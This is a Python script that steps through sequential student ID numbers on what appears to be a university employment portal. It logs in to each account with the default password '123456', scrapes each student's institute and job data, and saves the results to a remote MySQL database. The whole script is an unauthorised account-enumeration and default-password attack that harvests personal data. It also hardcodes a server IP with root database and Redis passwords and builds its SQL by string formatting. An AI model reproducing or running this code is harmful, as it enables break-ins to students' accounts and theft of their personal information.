import threading
import time
import MySQLdb
import requests
import redis
import re

base_number = 12015050101001
invalid = 0
user_name = ''
pass_word = 123456

redis_info = {
    'host': '119.23.214.123',
    'password': 'ta',
    'port': 6379,
    'db': 0,
}

mysql_info = {
    'host': "119.23.214.123",
    'password': 'ta',
    'user': 'root',
    'database': 'StudentMsg_development'
}

msg_url = 'http://jiuye.csmu.edu.cn/jy/desktop/index?note=true'
login_url = 'http://jiuye.csmu.edu.cn/jy/login'

headers = {
    'content-type': "application/x-www-form-urlencoded",
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
    'Connection': 'close'
}


class DbMysql(object):
    instance = MySQLdb.connect(mysql_info['host'], mysql_info['user'], mysql_info['password'],
                               mysql_info['database'], charset='utf8')
    cursor = instance.cursor()

    @staticmethod
    def Insert(n, t, v):
        sql = """insert users(id, institute, job) value(%s, '%s', '%s');""" % (n, t, v)
        print(sql)
        try:
            DbMysql.cursor.execute(sql)
            DbMysql.instance.commit()
        except:
            DbMysql.instance.rollback()

    @staticmethod
    def Close():
        DbMysql.instance.close()


class DbRedis():
    def __init__(self):
        self.conn = None
        if not hasattr(DbRedis, 'pool'):
            DbRedis.getRedisConn()
        self.conn = redis.Redis(connection_pool=DbRedis.pool)

    @staticmethod
    def getRedisConn():
        DbRedis.pool = redis.ConnectionPool(host=redis_info['host'], password=redis_info['password'],
                                            port=redis_info['port'], db=redis_info['db'])

    """
    string类型 {'key':'value'} redis操作
    """

    def setredis(self, key, value, time=None):
        # 非空即真非0即真
        if time:
            res = self.conn.setex(key, value, time)
        else:
            res = self.conn.set(key, value)
        return res

    def getRedis(self, key):
        res = self.conn.get(key).decode()
        return res

    def delRedis(self, key):
        res = self.conn.delete(key)
        return res

    """
    hash类型，{'name':{'key':'value'}} redis操作
    """

    def setHashRedis(self, name, key, value):
        res = self.conn.hset(name, key, value)
        return res

    def getHashRedis(self, name, key=None):
        # 判断key是否我为空，不为空，获取指定name内的某个key的value; 为空则获取name对应的所有value
        if key:
            res = self.conn.hget(name, key)
        else:
            res = self.conn.hgetall(name)
        return res

    def delHashRedis(self, name, key=None):
        if key:
            res = self.conn.hdel(name, key)
        else:
            res = self.conn.delete(name)
        return res



def get_job(text: str):
    job = re.search(r'name=\"yxdw1\" value=\"(.*?)\"', text).group()
    job = str.replace(job, 'name="yxdw1" value="', '')
    job = str.replace(job, '"', '')
    return job


def get_institute(text: str):
    institutes = re.search(r'important; \" value=\"(.*?)\"\/\>', text).group()
    institutes = str.replace(institutes, 'important; " value="', '')
    institutes = str.replace(institutes, '"/>', '')
    print(institutes)
    return institutes


def save_db(institute, job):
    global invalid
    global base_number
    # dbredis = DbRedis()
    invalid += 1
    # dbredis.setHashRedis(str(invalid), 'institute', institute)
    # dbredis.setHashRedis(str(invalid), 'job', job)
    DbMysql.Insert(invalid, institute, job)
    base_number+=1
    print('save access', invalid)


def parse_html(text: str):
    job = get_job(text)
    institute = get_institute(text)
    save_db(institute, job)



def ispwd(html):
    if re.search(r'密码错误', html) is not None:
        return False
    else:
        return True

def isexist(html: str):
    if re.search(r'账号不存在', html) is not None:
        return False
    else:
        return True


def iserror(html:str):
    if re.search(r'系统错误', html) is not None:
        return False
    else:
        return True


################################
# 12015050301021
# 15年级
# 07专业号
# 01 班级号
# 031 学号
###############################


def start():
    while True:
        global base_number
        data = {'user_name': base_number, 'pass_word': pass_word}
        requests.adapters.DEFAULT_RETRIES = 5  # 增加重连次数
        try:
            session = requests.sessions.session()
            session.keep_alive = False
            session.get(login_url)  # get login of cookie
            res = session.request("POST", login_url, data=data, headers=headers)
            if ispwd(res.text) is not True:
                base_number+=1
                continue
            if isexist(res.text) is True:
                print(base_number, '.....................')
                res = session.request("GET", msg_url, headers=headers)
                if iserror(res.text) is True:
                    parse_html(res.text)
                    base_number += 1
                    continue
                else:
                    print('not find number1', base_number)
                    base_number -= base_number % 10000
                    base_number+=1
                    base_number += 100000
            else:
                print('not find number 2', base_number)
                if base_number % 1000 == 1:
                    base_number += 101000
                    continue
                else:
                    if base_number%1000+1000>10000:
                        base_number -= base_number % 10000
                        base_number += 10001
                    else:
                        base_number -= base_number % 1000
                        base_number += 1001
                    continue
        except:
            print("timeout ....")
            time.sleep(2)
            continue


def end():
    DbMysql.Close()


if __name__ == '__main__':
    start()
    end()
